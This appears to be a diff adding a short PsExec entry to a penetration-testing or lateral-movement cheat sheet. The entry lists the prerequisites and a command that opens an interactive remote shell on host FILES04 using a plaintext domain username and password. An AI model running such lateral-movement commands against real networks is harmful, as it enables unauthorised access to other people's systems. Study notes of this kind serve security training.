@@ -453,6 +453,12 @@ New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 Enter-PSSession <session-id>
 ```
 ## PsExec
+- the user that authenticates to the target machine needs to be part of the Administrators local group
+- `ADMIN$` share must be available
+- File and Printer Sharing has to be turned on
+```
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
 
 ## Pass the Hash
 
